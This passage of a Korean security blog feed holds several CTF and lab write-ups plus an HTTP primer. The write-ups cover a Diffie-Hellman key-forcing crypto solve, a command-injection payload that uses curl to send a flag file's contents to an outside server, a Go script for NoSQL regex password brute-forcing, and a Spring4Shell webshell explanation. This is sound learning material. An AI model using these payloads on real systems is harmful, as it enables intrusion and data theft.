cipher.decrypt(encrypted) return message def main(s): sendMessage(s, DEBUG_MSG + \u0026#34;Generating The Global DH Parameters\\n\u0026#34;) sendMessage(s, DEBUG_MSG + f\u0026#34;g = {g}, p = {p}\\n\u0026#34;) sendMessage(s, DEBUG_MSG + \u0026#34;Calculation Complete\\n\\n\u0026#34;) sendMessage(s, DEBUG_MSG + \u0026#34;Generating The Public Key of CPU...\\n\u0026#34;) c = random.randrange(2, p - 1) C = pow(g, c, p) sendMessage(s, DEBUG_MSG + \u0026#34;Calculation Complete\\n\u0026#34;) sendMessage(s, DEBUG_MSG + \u0026#34;Public Key is: ???\\n\\n\u0026#34;) M = recieveMessage(s, \u0026#34;Enter The Public Key of The Memory: \u0026#34;) try: M = int(M) except: sendMessage(s, DEBUG_MSG + \u0026#34;Unexpected Error Occured\\n\u0026#34;) exit() sendMessage(s, \u0026#34;\\n\u0026#34; + DEBUG_MSG + \u0026#34;The CPU Calculates The Shared Secret\\n\u0026#34;) shared_secret = pow(M, c, p) sendMessage(s, DEBUG_MSG + \u0026#34;Calculation Complete\\n\\n\u0026#34;) encrypted_sequence = recieveMessage( s, \u0026#34;Enter The Encrypted Initialization Sequence: \u0026#34;) try: encrypted_sequence = bytes.fromhex(encrypted_sequence) assert len(encrypted_sequence) % 16 == 0 except: sendMessage(s, DEBUG_MSG + \u0026#34;Unexpected Error Occured\\n\u0026#34;) exit() sequence = decrypt(encrypted_sequence, shared_secret) if sequence == b\u0026#34;Initialization Sequence - Code 0\u0026#34;: sendMessage(s, \u0026#34;\\n\u0026#34; + DEBUG_MSG + \u0026#34;Reseting The Protocol With The New Shared Key\\n\u0026#34;) sendMessage(s, DEBUG_MSG + f\u0026#34;{FLAG}\u0026#34;) else: exit() if __name__ == \u0026#39;__main__\u0026#39;: socketserver.TCPServer.allow_reuse_address = True server = ReusableTCPServer((\u0026#34;0.0.0.0\u0026#34;, 1337), Handler) server.serve_forever() 처음에 해석이 잘 되지 않아 불필요한 코드를 제거하였고, 아래와 같이 정리 했다.\nfrom Crypto.Cipher import AES from Crypto.Util.number import long_to_bytes import hashlib import random import socketserver import signal p = 0x509efab16c5e2772fa00fc180766b6e62c09bdbd65637793c70b6094f6a7bb8189172685d2bddf87564fe2a6bc596ce28867fd7bbc300fd241b8e3348df6a0b076a0b438824517e0a87c38946fa69511f4201505fca11bc08f257e7a4bb009b4f16b34b3c15ec63c55a9dac306f4daa6f4e8b31ae700eba47766d0d907e2b9633a957f19398151111a879563cbe719ddb4a4078dd4ba42ebbf15203d75a4ed3dcd126cb86937222d2ee8bddc973df44435f3f9335f062b7b68c3da300e88bf1013847af1203402a3147b6f7ddab422d29d56fc7dcb8ad7297b04ccc52f7bc5fdd90bf9e36d01902e0e16aa4c387294c1605c6859b40dad12ae28fdfd3250a2e9 g = 2 c = random.randrange(2, p - 1) C = pow(g, c, p) M = ‘’ # 뭔가를 입력받음 M = int(M) shared_secret = pow(M, c, p) encrypted_sequence = \u0026#39;\u0026#39; # 뭔가 입력받음 encrypted_sequence = bytes.fromhex(encrypted_sequence) key = hashlib.md5(long_to_bytes(shared_secret)).digest() cipher = AES.new(key, AES.MODE_ECB) message = cipher.decrypt(encrypted_sequence) 코드를 해석해보면 아래의 흐름으로 코드가 실행 되고 있다는 것을 알 수 있었다.\n 고정된 값을 통해 난수생성 M을 입력받아 생성한 난수와 pow() 연산을 통해 난수 생성 생성한 난수를 md5 digest 값을 생성하여 키 값으로 저장 해당 키값과 입력받는 encrypted_sequence 를 AES ECB로 object를 생성 object를 decrypt하여 키값(b\u0026rsquo;Initialization Sequence - Code 0’)과 비교하여 동일하면 FLAG출력  이러한 흐름으로 봤을떄 md5 digest값으로 생성한 키 값만 고정시키고 해당 키로 AES ECB encrypt 할 경우 FLAG를 얻을 수 있을 것이라고 생각이 들었다.\n이를 위해 M에 0을 입력하여 키 값을 고정시켰고, 아래와 같은 키값을 생성할 수 있었다.\nkey: b'\\x93\\xb8\\x85\\xad\\xfe\\r\\xa0\\x89\\xcd\\xf64\\x90O\\xd5\\x9fq' 해당 키를 가지고 AES ECB로 인코드하는 코드를 만들었고, 해당 코드로 키 값을 생성을 하면 아래와 같은 키 값을 생성 할 수 있었다\nb'1af761314a07bf79f31aeb53bc9e1335e1749e1142b326d82a3c29ac37a042bf' 인크립션 코드는 아래 참조\nfrom Crypto.Cipher import AES import binascii key = b\u0026#39;\\x93\\xb8\\x85\\xad\\xfe\\r\\xa0\\x89\\xcd\\xf64\\x90O\\xd5\\x9fq\u0026#39; msg = (b\u0026#39;Initialization Sequence - Code 0\u0026#39;) cipher = AES.new(key, AES.MODE_ECB) msg_en = cipher.encrypt(msg) print(binascii.hexlify(msg_en)) 최종적으로 nc로 해당 서버에 붙어 구한 M값과 encryption코드를 입력하면 FLAG 나오는 것을 확인할 수 있었다.\n","date":"2022-05-25T15:34:01+09:00","image":"https://appealso.github.io/p/hack-the-box-crypto-android-in-the-middle/cover_hu6c7d8e00816a314732898bca532296f9_14244_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/hack-the-box-crypto-android-in-the-middle/","title":"Hack The Box - [Crypto] - Android-in-the-Middle"},{"content":"[MISC] - Matrioshka Brain Matrioshka Brain 해당 문제는 heat_measurements.csv 파일을 제공했고 해당 파일에서 Flag를 추출해내는 문제였다.\n heat_measurements.csv  해당 파일을 열면 아래와 같은 표를 확인할 수 있다.\n misc  ￼ 해당 표를 봤을때 열 측정을 표로 표현한것이라고 생각이 들었다. 그리고 이를 그래픽으로 바꿔줄수 있으면 FLAG 값이 나올것이라고 생각이 들었다. 구글에서 검색해본결과 seaborn 이라는 라이브러리를 활용하여 그래픽으로 표시를 해주면 FLAG를 얻을 수 있을 것이라고 생각이 들었다. 아래와 같은 코드를 작성하여 FLAG를 얻을 수 있었다.\nimport seaborn as sns import pandas as pd import matplotlib.pyplot as plt value=[[28,88,70,21,64,25,20,26,25,24,61,24,22,22,63,60,79,23,20,83,64,22,69,67,27,64,80,72,23,80,28,73,89,86,30,60,84,23,26,62,81,23,75,66,26,74,67,24,23,29,67,70,28,26,66,77,67,71,76,76,80,72,20,20,72,81,30,87,65,21,62,77,29,26,87,73,28,24,30,61,84,70,27,26,70,78,26,79,84,86,20,63,62,68,78,68,84,87,20,80,86,28,71,60,86,22,62,27,83,63,64,22,82,60,30,22,86,62,26,79,89,20,82,64,20,26,26,65,69,28,29,65,67,60,65,84,82,88,29,82,85,25,87,83,21,28,86,64,61,86,25,69,60,26,23,29,29,27,82,24,25,78], [27,73,71,22,88,72,87,27,84,61,74,27,74,89,26,80,71,21,75,71,26,26,69,88,20,28,78,27,27,83,20,27,73,29,24,65,20,87,79,24,74,25,22,89,26,75,23,63,64,65,63,22,72,86,21,88,63,61,70,78,67,27,90,87,28,64,29,30,86,26,69,26,64,63,28,60,26,89,82,28,70,22,84,66,72,89,25,61,73,60,30,64,63,63,82,70,74,21,30,60,70,29,23,67,20,24,73,22,29,83,30,23,64,21,71,84,24,75,29,26,77,28,78,30,72,63,72,67,29,90,90,27,77,73,88,80,61,88,21,88,61,30,87,26,65,78,26,79,89,28,30,90,62,60,74,24,66,82,64,82,24,86], [21,28,28,30,61,64,76,25,66,83,62,23,29,24,77,90,28,89,70,85,73,22,88,63,22,64,23,79,22,83,30,81,25,62,28,82,83,80,23,89,67,20,69,21,21,74,90,24,23,86,89,74,63,27,74,80,84,84,76,70,74,61,78,30,61,89,21,78,26,27,69,61,79,21,60,61,22,25,22,82,87,22,67,25,24,72,78,23,21,20,79,64,70,63,63,61,67,90,20,82,69,30,68,26,76,22,60,28,69,23,76,21,74,66,87,27,62,72,24,61,22,23,68,67,26,28,82,88,67,89,24,66,90,86,71,72,64,69,23,22,24,27,70,70,69,22,65,80,23,75,30,65,74,77,61,22,67,88,71,86,69,28], [25,63,86,21,61,78,82,28,64,61,81,26,90,89,22,69,74,29,90,79,60,22,71,87,24,64,76,71,25,64,28,66,82,70,26,85,23,86,85,24,65,21,79,71,30,61,80,78,61,24,88,25,65,85,26,74,60,73,87,82,86,30,64,85,23,72,20,71,70,30,69,25,87,85,22,70,23,83,30,80,68,29,60,84,21,90,68,77,22,63,87,78,61,76,62,78,61,81,26,86,69,29,61,80,73,23,89,20,76,79,68,26,71,24,77,68,21,65,27,83,83,30,75,88,74,67,24,67,27,69,80,21,86,81,75,77,88,70,22,89,61,27,60,28,71,87,29,85,27,27,23,27,64,85,64,28,82,61,86,65,30,61], [26,86,90,29,87,89,65,28,88,64,85,20,22,26,88,82,69,26,24,75,25,27,27,90,22,72,80,79,20,73,29,61,89,79,30,71,67,21,22,73,64,24,73,67,23,84,25,24,22,83,70,83,29,20,70,82,23,26,22,25,61,64,30,24,70,64,25,79,66,25,76,79,26,25,86,68,26,63,61,27,73,72,27,21,76,73,79,66,23,74,81,85,20,26,22,28,74,25,21,22,83,29,82,90,62,24,65,30,88,79,84,20,67,61,21,26,70,65,22,84,61,23,75,23,21,21,81,64,90,30,28,75,70,25,30,24,24,81,21,73,76,20,86,72,25,22,69,79,74,68,21,89,78,60,77,30,77,69,85,24,23,70]] x=[\u0026#34;1\u0026#34;,\u0026#34;2\u0026#34;,\u0026#34;3\u0026#34;,\u0026#34;4\u0026#34;,\u0026#34;5\u0026#34;,\u0026#34;6\u0026#34;,\u0026#34;7\u0026#34;,\u0026#34;8\u0026#34;,\u0026#34;9\u0026#34;,\u0026#34;10\u0026#34;,\u0026#34;11\u0026#34;,\u0026#34;12\u0026#34;,\u0026#34;13\u0026#34;,\u0026#34;14\u0026#34;,\u0026#34;15\u0026#34;,\u0026#34;16\u0026#34;,\u0026#34;17\u0026#34;,\u0026#34;18\u0026#34;,\u0026#34;19\u0026#34;,\u0026#34;20\u0026#34;,\u0026#34;21\u0026#34;,\u0026#34;22\u0026#34;,\u0026#34;23\u0026#34;,\u0026#34;24\u0026#34;,\u0026#34;25\u0026#34;,\u0026#34;26\u0026#34;,\u0026#34;27\u0026#34;,\u0026#34;28\u0026#34;,\u0026#34;29\u0026#34;,\u0026#34;30\u0026#34;,\u0026#34;31\u0026#34;,\u0026#34;32\u0026#34;,\u0026#34;33\u0026#34;,\u0026#34;34\u0026#34;,\u0026#34;35\u0026#34;,\u0026#34;36\u0026#34;,\u0026#34;37\u0026#34;,\u0026#34;38\u0026#34;,\u0026#34;39\u0026#34;,\u0026#34;40\u0026#34;,\u0026#34;41\u0026#34;,\u0026#34;42\u0026#34;,\u0026#34;43\u0026#34;,\u0026#34;44\u0026#34;,\u0026#34;45\u0026#34;,\u0026#34;46\u0026#34;,\u0026#34;47\u0026#34;,\u0026#34;48\u0026#34;,\u0026#34;49\u0026#34;,\u0026#34;50\u0026#34;,\u0026#34;51\u0026#34;,\u0026#34;52\u0026#34;,\u0026#34;53\u0026#34;,\u0026#34;54\u0026#34;,\u0026#34;55\u0026#34;,\u0026#34;56\u0026#34;,\u0026#34;57\u0026#34;,\u0026#34;58\u0026#34;,\u0026#34;59\u0026#34;,\u0026#34;60\u0026#34;,\u0026#34;61\u0026#34;,\u0026#34;62\u0026#34;,\u0026#34;63\u0026#34;,\u0026#34;64\u0026#34;,\u0026#34;65\u0026#34;,\u0026#34;66\u0026#34;,\u0026#34;67\u0026#34;,\u0026#34;68\u0026#34;,\u0026#34;69\u0026#34;,\u0026#34;70\u0026#34;,\u0026#34;71\u0026#34;,\u0026#34;72\u0026#34;,\u0026#34;73\u0026#34;,\u0026#34;74\u0026#34;,\u0026#34;75\u0026#34;,\u0026#34;76\u0026#34;,\u0026#34;77\u0026#34;,\u0026#34;78\u0026#34;,\u0026#34;79\u0026#34;,\u0026#34;80\u0026#34;,\u0026#34;81\u0026#34;,\u0026#34;82\u0026#34;,\u0026#34;83\u0026#34;,\u0026#34;84\u0026#34;,\u0026#34;85\u0026#34;,\u0026#34;86\u0026#34;,\u0026#34;87\u0026#34;,\u0026#34;88\u0026#34;,\u0026#34;89\u0026#34;,\u0026#34;90\u0026#34;,\u0026#34;91\u0026#34;,\u0026#34;92\u0026#34;,\u0026#34;93\u0026#34;,\u0026#34;94\u0026#34;,\u0026#34;95\u0026#34;,\u0026#34;96\u0026#34;,\u0026#34;97\u0026#34;,\u0026#34;98\u0026#34;,\u0026#34;99\u0026#34;,\u0026#34;100\u0026#34;,\u0026#34;101\u0026#34;,\u0026#34;102\u0026#34;,\u0026#34;103\u0026#34;,\u0026#34;104\u0026#34;,\u0026#34;105\u0026#34;,\u0026#34;106\u0026#34;,\u0026#34;107\u0026#34;,\u0026#34;108\u0026#34;,\u0026#34;109\u0026#34;,\u0026#34;110\u0026#34;,\u0026#34;111\u0026#34;,\u0026#34;112\u0026#34;,\u0026#34;113\u0026#34;,\u0026#34;114\u0026#34;,\u0026#34;115\u0026#34;,\u0026#34;116\u0026#34;,\u0026#34;117\u0026#34;,\u0026#34;118\u0026#34;,\u0026#34;119\u0026#34;,\u0026#34;120\u0026#34;,\u0026#34;121\u0026#34;,\u0026#34;122\u0026#34;,\u0026#34;123\u0026#34;,\u0026#34;124\u0026#34;,\u0026#34;125\u0026#34;,\u0026#34;126\u0026#34;,\u0026#34;127\u0026#34;,\u0026#34;128\u0026#34;,\u0026#34;129\u0026#34;,\u0026#34;130\u0026#34;,\u0026#34;131\u0026#34;,\u0026#34;132\u0026#34;,\u0026#34;133\u0026#34;,\u0026#34;134\u0026#34;,\u0026#34;135\u0026#34;,\u0026#34;136\u0026#34;,\u0026#34;137\u0026#34;,\u0026#34;138\u0026#34;,\u0026#34;139\u0026#34;,\u0026#34;140\u0026#34;,\u0026#34;141\u0026#34;,\u0026#34;142\u0026#34;,\u0026#34;143\u0026#34;,\u0026#34;144\u0026#34;,\u0026#34;145\u0026#34;,\u0026#34;146\u0026#34;,\u0026#34;147\u0026#34;,\u0026#34;148\u0026#34;,\u0026#34;149\u0026#34;,\u0026#34;150\u0026#34;,\u0026#34;151\u0026#34;,\u0026#34;152\u0026#34;,\u0026#34;153\u0026#34;,\u0026#34;154\u0026#34;,\u0026#34;155\u0026#34;,\u0026#34;156\u0026#34;,\u0026#34;157\u0026#34;,\u0026#34;158\u0026#34;,\u0026#34;159\u0026#34;,\u0026#34;160\u0026#34;,\u0026#34;161\u0026#34;,\u0026#34;162\u0026#34;] y=[\u0026#34;Sphere 1\u0026#34;,\u0026#34;Sphere 2\u0026#34;,\u0026#34;Sphere 3\u0026#34;,\u0026#34;Sphere 4\u0026#34;,\u0026#34;Sphere 5\u0026#34;] df = pd.DataFrame(value,columns=x, index=y) fig, ax = plt.subplots(figsize=(500,20)) # figsize ax = sns.heatmap(df, cmap=\u0026#34;PiYG\u0026#34;, # cmap Color annot=True, # Value Text fmt=\u0026#34;d\u0026#34;, # Value type (interge = \u0026#34;d\u0026#34;) linewidths=0) ","date":"2022-05-25T15:34:01+09:00","image":"https://appealso.github.io/p/hack-the-box-misc-matrioshka-brain-matrioshka-brain/cover_hu6c7d8e00816a314732898bca532296f9_14244_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/hack-the-box-misc-matrioshka-brain-matrioshka-brain/","title":"Hack The Box - [MISC] -Matrioshka Brain Matrioshka Brain"},{"content":"HTTP/HTTPS HTTP란?  HTTP란 Hyper Text Transfer Protocol의 약자로 말 그대로 하이퍼 텍스트를 전송 HTTP는 클라이언트와 서버 사이에 이루어지는 요청/응답 프로토콜  특징  무상태(Stateless): HTTP는 상태를 저장하지 않는다. 즉, 통신간의 연결 상태 처리나, 정보를 저장할 필요가 없기 때문에 서버 디자인이 간단해진다는 장점이 있다. 만약 저장이 필요한 경우에는 쿠키나 세션을 활용해 정보를 저장할 수 있다. 비연결성(Connectionless): HTTP는 클라이언트와 서버가 한 번 연결을 맺은 후, 클라이언트의 요청에 대해 서버가 응답을 마치면 맺었던 연결을 끊어버리는 성질을 말한다. 이러한 특징의 장점은 컴퓨터마다 매번 연결을 유지할 필요가 없기 때문에 리소스를 줄일 수 있어 더 많은 연결을 그때그때 수행할 수 있다는 장점이 있다. 하지만 연결 해제를 매번 해주어야 때문에 이에 대한 오버헤드가 일어난다는 단점또한 가지고 있다.  흐름  TCP 연결을 Open HTTP 메시지를 전송  http  서버에 의해 전송된 응답  http  연결을 닫거나 다른 요청들을 위해 재사용합니다.  HTTP Method    HTTP Method 전송 형태 설명     GET GET [request-uri]?query_string - 요청받은 URI의 정보를 검색하여 응답한다. - GET을 사용하는 요청은 오직 데이터를 받기만 한다.   HEAD HEAD [request-uri] - HEAD 메서드는 GET 메서드의 요청과 동일한 응답을 요구하지만, 응답 본문을 포함하지 않는다. - 웹서버 정보확인, 헬스체크, 버젼확인, 최종 수정일자 확인등의 용도로 사용된다.   POST POST [request-uri] Content-Type:[Content Type] [데이터] - 요청된 자원을 생성/수정한다.- 새로 작성된 리소스인 경우 HTTP헤더 항목 Location : URI주소를 포함하여 응답한다.   PUT PUT [request-uri] Content-Type:[Content Type] [데이터] - 요청된 자원을 수정(UPDATE)한다. - 내용 갱신을 위주로 Location : URI를 보내지 않아도 된다. - 클라이언트측은 요청된 URI를 그대로 사용하는 것으로 간주한다.   PATCH PATCH [request-uri] Content-Type:[Content Type] [데이터] - PUT과 유사하게 요청된 자원을 수정(UPDATE)할 때 사용한다.- PUT의 경우 자원 전체를 갱신하는 의미지만, PATCH는 해당 자원의 일부를 교체하는 의미로 사용한다.   DELETE DELETE [request-uri] - 요청된 자원을 삭제할 것을 요청함.- 안전성 문제로 대부분의 서버에서 비활성한다.   CONNECT CONNECT [request-uri] 동적으로 터널 모드를 교환, 프락시 기능을 요청시 사용한다.   TRACE TRACE [request-uri] 원격지 서버에 루프백 메시지 호출하기 위해 테스트용으로 사용한다.   OPTIONS OPTIONS [request-uri] 웹서버에서 지원되는 메소드의 종류를 확인할 경우 사용한다.    HTTP 응답 코드  조건부 응답     응답코드 설명     100 Continue (클라이언트로 부터 일부 요청을 받았으며 나머지 정보를 계속 요청함)   101 Switching protocols   102 처리    성공     응답코드 설명     200 OK(요청이 성공적으로 수행되었음)   201 Created (PUT 메소드에 의해 원격지 서버에 파일 생성됨)   202 서버가 요청을 접수했지만 아직 처리하지 않았다.   203 서버가 요청을 성공적으로 처리했지만 다른 소스에서 수신된 정보를 제공하고 있다.   204 No content, (사용자 요구 처리하였으나 전송할 데이터가 없음)   205 서버가 요청을 성공적으로 처리했지만 콘텐츠를 표시하지 않는다. 204 응답과 달리 이 응답은 요청자가 문서 보기를 재설정할 것을 요구한다(예: 새 입력을 위한 양식 비우기).   206 서버가 GET 요청의 일부만 성공적으로 처리했다.    리다이렉션 완료     응답코드 설명     300 서요청한 페이지를 새 위치로 영구적으로 이동했다. GET 또는 HEAD 요청에 대한 응답으로 이 응답을 표시하면 요청자가 자동으로 새 위치로 전달된다.   301 Moved permanently (요구한 데이터를 변경된 타 URL에 요청함)   302 현재 서버가 다른 위치의 페이지로 요청에 응답하고 있지만 요청자는 향후 요청 시 원래 위치를 계속 사용해야 한다.   303 요청자가 다른 위치에 별도의 GET 요청을 하여 응답을 검색할 경우 서버는 이 코드를 표시한다. HEAD 요청 이외의 모든 요청을 다른 위치로 자동으로 전달한다.   304 마지막 요청 이후 요청한 페이지는 수정되지 않았다. 서버가 이 응답을 표시하면 페이지의 콘텐츠를 표시하지 않는다. 요청자가 마지막으로 페이지를 요청한 후 페이지가 변경되지 않으면 이 응답(If-Modified-Since HTTP 헤더라고 함)을 표시하도록 서버를 구성해야 한다.   305 요청자는 프록시를 사용하여 요청한 페이지만 액세스할 수 있다. 서버가 이 응답을 표시하면 요청자가 사용할 프록시를 가리키는 것이기도 하다.   307 현재 서버가 다른 위치의 페이지로 요청에 응답하고 있지만 요청자는 향후 요청 시 원래 위치를 계속 사용해야 한다.    요청 오류     응답코드 설명     400 Bad request (사용자의 잘못된 요청을 처리할 수 없음)   401 Unauthorized (인증이 필요한 페이지를 요청한 경우)   402 Payment required(예약됨)   403 Forbidden (접근 금지, 디렉터리 리스팅 요청 및 관리자 페이지 접근 등을 차단)   404 Not found, (요청한 페이지 없음)   405 Method not allowed (혀용되지 않는 http method 사용함)   407 Proxy authentication required (프락시 인증 요구됨)   408 Request timeout (요청 시간 초과)   409 서버가 요청을 수행하는 중에 충돌이 발생했다. 서버는 응답할 때 충돌에 대한 정보를 포함해야 한다. 서버는 PUT 요청과 충돌하는 PUT 요청에 대한 응답으로 이 코드를 요청 간 차이점 목록과 함께 표시해야 한다.   410 Gone (영구적으로 사용 금지)   412 Precondition failed (전체 조건 실패)   414 Request-URI too long (요청 URL 길이가 긴 경우임)    서버오류     응답코드 설명     500 Internal server error (내부 서버 오류)   501 Not implemented (웹 서버가 처리할 수 없음)   503 Service unnailable (서비스 제공 불가)   504 Gateway timeout (게이트웨이 시간 초과)   505 HTTP version not supported (해당 http 버전 지원되지 않음)    HTTP란?  https   https \n HTTPS는 기본 골격이나 사용 목적 등은 HTTP와 거의 동일하지만, 데이터를 주고 받는 과정에 ‘보안’ 요소가 추가됨 HTTPS를 사용하면 서버와 클라이언트 사이의 모든 통신 내용이 암호화된다. HTTPS는 SSL이나 TLS 프로토콜을 통해 세션 데이터를 암호화하며, 기본 TCP/IP 포트는 443이고, SSL 프로토콜 위에서 HTTPS 프로토콜이 동작  SSL / TLS  SSL은 넷스케이프에 의해 작성된 프로토콜 1995년 version1은 출시되지 않았고, version2는 넷스케이프 1.1 브라우저로 시작 버전 2에 몇가지 주요 보안 문제가 있어서, version3을 출시 이후 1999년이 끝나기 전에 IETF는 TLS1.0을 발표 TLS1.1버전이 2006년에 릴리즈 되었고, 2008년에 TLS1.2버전이 몇가지 결함과 악용을 해결하기 위해 릴리즈 혼란 야기 방지차원에서 SSL 3.0은 2015년 공식적으로 사용 종료 이후 TLS 1.3 버전은 보안 2018년 3월에 승인됨 TLS 1.3버전은 보안 기능을 크게 향상시키고 이전의 약한 기능을 제거  출처 및 참고 https://developer.mozilla.org/ko/docs/Web/HTTP/Overview\nhttps://hanamon.kr/네트워크-http-http란-특징-무상태-비연결성/\nhttps://kyun2da.dev/CS/http란/\nhttps://developer.mozilla.org/ko/docs/Web/HTTP/Methods https://ko.wikipedia.org/wiki/HTTP_상태_코드 https://incheol-jung.gitbook.io/docs/q-and-a/computer-science/http-method https://rachel-kwak.github.io/2021/03/08/HTTPS.html https://bumday.tistory.com/43\n","date":"2022-05-08T16:00:35+09:00","permalink":"https://appealso.github.io/p/%EC%9B%B9-%EA%B8%B0%EC%B4%88-%EC%A0%95%EB%A6%AC2-http/https/","title":"웹 기초 정리(2) - HTTP/HTTPS"},{"content":"[문제]  Read the flag file XD\n [해결법]  HTTP GET Method 우회하여 푸는 문제였다 아래 서버 코드를 보면 GET request를 받을 경우 GET 요청이 아닐 경우 커맨드가 실행되는 것을 확인할 수 있었다.  #!/usr/bin/env python3 from flask import Flask, request import os app = Flask(__name__) @app.route(\u0026#39;/\u0026#39; , methods=[\u0026#39;GET\u0026#39;]) def index(): cmd = request.args.get(\u0026#39;cmd\u0026#39;, \u0026#39;\u0026#39;) if not cmd: return \u0026#34;?cmd=[cmd]\u0026#34; if request.method == \u0026#39;GET\u0026#39;: \u0026#39;\u0026#39; else: os.system(cmd) return cmd app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000)   BURP로 OPTIONS 요청을 보내 사용가능한 Method를 확인했다.  ctf \n  GET으로는 우회가 안되니 HEAD를 활용한 문제라는 것을 알 수 있었다.\n  HEAD 메소드 특성상 body가 들어가지 않기 떄문에 curl을 이용해 외부서버에 요청하기로 생각했다.\n참고 https://developer.mozilla.org/ko/docs/Web/HTTP/Methods/HEAD\n  요청 서버는 dreamhack 에서 제공하는 서버에 요청하기로 생각을 했고 payload를 작성해서 날리니 해결되었다.\n dreamhack tool : https://tools.dreamhack.games/    HEAD /?cmd=curl -d \u0026ldquo;$(cat flag.py)\u0026rdquo;  ctf \n  정답화면은 SKIP\n++ app.py를 수정해서 답을 찾아볼까도 생각을 했는데, 쓰기 권한이 빠져있어서 이건 안될 것이라고 생각이 든다.\n  ","date":"2022-05-06T21:57:09+09:00","permalink":"https://appealso.github.io/p/dreamhack-blind-command/","title":"[dreamhack] blind-command"},{"content":"[문제]  이 문제는 데이터베이스에 저장된 플래그를 획득하는 문제입니다.\n플래그는 admin 계정의 비밀번호 입니다.\n플래그의 형식은 DH{…} 입니다.\n{‘uid’: ‘admin’, ‘upw’: ‘DH{32alphanumeric}’}\n [해결법]  NoSQL 인젝션을 하는 문제 NoSQL 인젝션에 사용하는 정규표현식을 필터링 하지 않아 쉽게 추출할 수 있었다. Go 공부할겸 Go로 짜보았는데 문법이 익숙하지 않아 2시간정도 걸린것 같다;ㅁ; Go에서 알파벳, 숫자를 arr로 Converting 해주는 함수를 못 찾아 하드 코딩을 했는데 뭔가 지저분 해졌다.  package main import ( \u0026#34;fmt\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;net/http\u0026#34; ) func main() { var arr = [...]string{\u0026#34;0\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;3\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;5\u0026#34;, \u0026#34;6\u0026#34;, \u0026#34;7\u0026#34;, \u0026#34;8\u0026#34;, \u0026#34;9\u0026#34;, \u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;, \u0026#34;c\u0026#34;, \u0026#34;d\u0026#34;, \u0026#34;e\u0026#34;, \u0026#34;f\u0026#34;, \u0026#34;g\u0026#34;, \u0026#34;h\u0026#34;, \u0026#34;i\u0026#34;, \u0026#34;j\u0026#34;, \u0026#34;k\u0026#34;, \u0026#34;l\u0026#34;, \u0026#34;m\u0026#34;, \u0026#34;n\u0026#34;, \u0026#34;o\u0026#34;, \u0026#34;p\u0026#34;, \u0026#34;q\u0026#34;, \u0026#34;r\u0026#34;, \u0026#34;s\u0026#34;, \u0026#34;t\u0026#34;, \u0026#34;u\u0026#34;, \u0026#34;v\u0026#34;, \u0026#34;w\u0026#34;, \u0026#34;x\u0026#34;, \u0026#34;y\u0026#34;, \u0026#34;z\u0026#34;} var password string = \u0026#34;\u0026#34; n := 0 for n \u0026lt; 32 { for _, tmparr := range arr { var url string = \u0026#34;\u0026lt;attackURL\u0026gt;/login?uid[$regex]=^a.\u0026amp;upw[$regex]=.{\u0026#34; + password + tmparr resp, err := http.Get(url) if err != nil { panic(err) } defer resp.Body.Close() data, err := ioutil.ReadAll(resp.Body) if err != nil { panic(err) } if string(data) == \u0026#34;admin\u0026#34; { password += tmparr fmt.Printf(password + \u0026#34;\\n\u0026#34;) n += 1 break } } } } ","date":"2022-05-06T21:45:29+09:00","permalink":"https://appealso.github.io/p/dreamhack-mango/","title":"[dreamhack] Mango"},{"content":"수정중\u0026hellip;\nCookie/Session/Token Cookie Session JWT SOP Same Origin Cross Origin CORS\n","date":"2022-05-06T19:01:47+09:00","permalink":"https://appealso.github.io/p/basicweb3/","title":"Basicweb3"},{"content":"1. Spring4Shell 개요  Spring Core 프레임워크에서 특정 조건 하에 RCE(Remote Code Execution)가 가능한 취약점 Spring 프레임워크가 매개변수를 바인딩하는 과정에서 \u0026lsquo;class\u0026rsquo; 객체가 노출되어 발생 공격자는 해당 \u0026lsquo;class\u0026rsquo; 객체에서 로깅 관련 기능을 사용해 웹 쉘 코드를 업로드하여 명령어를 실행 가능  2. 취약점 POC (1) 테스트 환경  JDK 11 tocat-9.0.59 Spring Framework 5.3.15  (2) 매개변수 바인딩과 사용자 접근 Spring에서는 POJO(Plain Old Java Object)라고 불리는 일반 자바 객체의 속성에 URL을 통해 입력된 매개변수를 매핑하여 사용할 수 있습니다.\n// 객체클래스 public class Greeting { private long id; private String content; public long getId() { return id; } public void setId(long id) { this.id = id; } public String getContent() { return content; } public void setContent(String content) { this.content = content; } } //컨트롤러 @Controller public class HelloController { @GetMapping(\u0026#34;/greeting\u0026#34;) public String greetingForm(Model model) { model.addAttribute(\u0026#34;greeting\u0026#34;, new Greeting()); return \u0026#34;hello\u0026#34;; } @PostMapping(\u0026#34;/greeting\u0026#34;) public String greetingSubmit(@ModelAttribute Greeting greeting, Model model) { return \u0026#34;hello\u0026#34;; } } 위와 같이 Greetring이라는 객체와 Controller를 생성하면 가정한다면 일반적인 사용자는 “http:///greeting?id=test\u0026amp;content=test”과 같은 URL로 접근할 수 있습니다.\n(3) 취약점 공격 해당 취약점은 특정 상황에서 ‘class’라는 특수한 변수가 사용자에게 노출될 때 발생합니다. 현재 공개된 방식은 ‘classLoader’를 사용하여 Tomcat 로그를 이용하여 JSP 웹 쉘을 생성하는 방식입니다.\n1) 취약한 도커 이미지 실행 docker build . -t spring4shell \u0026amp;\u0026amp; docker run -p 8080:8080 spring4shell2) POC 코드 실행 python exploit.py --url \u0026#34;http://localhost:8080/helloworld/greeting\u0026#34;2-1) POC 코드 실행 시 Body에 class의 로깅 관련 객체가 사용되는 것을 확인할 수 있습니다. ‘class.module.classLoader.resources.context.parent.pipeline.first.pattern’ 매개 변수에 웹 쉘 코드를 담아 보내는 것을 확인할 수 있습니다.  burp \n2-2) POC 코드가 정상적으로 실행이 됐을 경우 웹 쉘 파일이 서버에 생성되는 것을 확인할 수 있습니다. $ find -name shell.jsp ./usr/local/tomcat/webapps/ROOT/shell.jsp 3) 웹쉘 접속 * 명령어 실행 생성한 웹 쉘에 원하는 명령어를 파라마터에 대입하여 요청할 경우 실행되는 것을 확인할 수 있습니다.  linux \n3. 영향받는 버전 CVE-2022-22965(Spring4Shell) ■ JDK 9 이상의 Spring 프레임워크 사용하는 경우\n Spring Framework 5.3.0 ~ 5.3.17 Spring Framework 5.2.0 ~ 5.2.19 및 이전 버전 ※ JDK 8 이하의 경우 취약점의 영향을 받지 않음  4. 취약한 버전 확인 